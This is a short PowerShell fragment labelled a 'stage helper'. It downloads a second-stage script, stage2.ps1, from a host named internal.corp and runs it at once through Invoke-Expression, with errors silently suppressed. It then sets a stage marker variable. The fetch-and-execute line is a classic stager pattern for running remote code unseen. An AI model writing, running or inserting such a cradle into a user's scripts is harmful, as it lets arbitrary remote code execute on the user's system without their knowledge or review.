# Stage helper
IEX (Invoke-WebRequest -Uri 'http://internal.corp/stage2.ps1' -UseBasicParsing -ErrorAction SilentlyContinue).Content
$StageMarker = "stage-16"
